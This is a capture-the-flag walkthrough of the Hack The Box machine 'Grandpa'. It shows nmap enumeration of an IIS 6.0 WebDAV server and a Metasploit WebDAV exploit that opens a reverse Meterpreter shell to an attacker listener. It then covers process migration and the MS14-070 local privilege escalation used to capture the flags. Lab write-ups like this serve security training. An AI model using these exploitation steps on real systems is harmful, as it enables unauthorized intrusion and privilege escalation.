# HTB - Grandpa

#### Ip: 10.10.10.14
#### Name: Grandpa
#### Rating: Easy

----------------------------------------------------------------------

Grandpa.png

### Enumeration

Lets kick things off by scanning all TCP ports with Nmap. Here I will also use the `--min-rate 10000` flag to speed the scan up.

```text
┌──(ryan㉿kali)-[~/HTB/Grandpa]
└─$ sudo nmap -p-  --min-rate 10000 10.10.10.14  
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 10:11 CDT
Nmap scan report for 10.10.10.14
Host is up (0.066s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
```

Ok, looks like just port 80 is open. Lets also scan the port with `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```text
┌──(ryan㉿kali)-[~/HTB/Grandpa]
└─$ sudo nmap -sC -sV -T4 10.10.10.14 -p 80    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 10:13 CDT
Nmap scan report for 10.10.10.14
Host is up (0.073s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Thu, 03 Aug 2023 15:13:57 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
```

We can see here that the site is running IIS 6.0, which is super old.

Navigating to the site we see the old-school and familiar Under Construction page from IIS 6 (I'm really dating myself here):

site.png

Searching for exploits for IIS 6 I find a page from Rapid7 (the owners of Metasploit), outlining the vulnerability.

rapid.png

This looks like it's definitely worth trying.

Lets open up Metasploit and find the right module:

msf.png

We can then update the lhost and Rhosts fields in Options:

options.png

Once set, all we need to do is `run` (or `exploit`, if you're feeling like Mr. Robot or something), and we open up a Meterpreter shell:

```text
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.46:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175686 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.46:4444 -> 10.10.10.14:1030) at 2023-08-03 10:45:34 -0500


meterpreter > 
``` 

It appears the shell we are in however is a bit wonky:

```text
meterpreter > whoami
[-] Unknown command: whoami
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```
If we run `ps` in Meterpreter, we can find list out running processes.

ps.png

Process 1736 seems especially interesting because it is running as  NT AUTHORITY\NETWORK SERVICE.

We can migrate to that process using the `migrate` command:

```text
meterpreter > migrate 1736
[*] Migrating from 1716 to 1736...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

Cool. Now we'll need to focus on escalating our privileges to get the flags:

```text
C:\Documents and Settings>cd Administrator
cd Administrator
Access is denied.

C:\Documents and Settings>cd Harry
cd Harry
Access is denied.
```

Lets go ahead and `background` this session and import the local_exploit_suggester module to check for privilege escalation vectors for us:

bg.png

Nice, the module found quite a few possible vectors. I'm most interested in trying exploit/windows/local/ms14_070_tcpip_ioctl.

I can search for and use this mmodule and then set the session as well as my lhost IP adress:

```text
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
session => 1
```

Once this runs we can interact with our session again using `sessions -i 1` and confirm the privilege escalation worked!

worked.png

We can now grab the two flags:

user_flag.png

root_flag.png

Thanks for following along!

-Ryan

----------------------------------------------------------------

